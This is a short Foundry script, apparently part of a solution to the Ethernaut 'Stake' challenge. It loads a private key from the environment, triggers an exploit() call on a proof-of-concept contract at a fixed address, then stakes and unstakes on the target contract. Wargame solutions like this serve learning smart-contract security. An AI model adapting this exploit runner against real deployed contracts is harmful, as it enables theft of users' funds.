// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "src/Ethernaut/stake_poc.sol";

contract StakePocScript is Script {
    function run() public {
        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);
        StakePoc poc = StakePoc(0xF51B9c55BA89C0C33c7383ECFA5B2b73fe8285fC);
        poc.exploit{value: 0.002 ether}();

        address stakeAddress = 0x3cB16d6d35cE31879C01c4ea8185740282D9DBe4;
        Stake stake = Stake(stakeAddress);
        stake.StakeETH{value: 0.002 ether}();
        stake.Unstake(0.002 ether);

        vm.stopBroadcast();
    }
}
